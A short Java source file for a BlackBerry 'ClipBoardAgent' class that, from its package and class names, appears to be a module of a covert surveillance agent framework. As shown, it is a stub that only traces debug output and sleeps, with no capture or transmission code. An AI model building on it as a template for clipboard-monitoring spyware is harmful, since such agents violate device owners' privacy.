package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ClipBoardAgent extends Agent {
	//#debug
    static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);

    public ClipBoardAgent(boolean agentStatus) {
        super(Agent.AGENT_CLIPBOARD, agentStatus, true, "ClipBoardAgent");
    }

    protected ClipBoardAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
     // #debug
        debug.trace("parse");
        return false;
    }
}
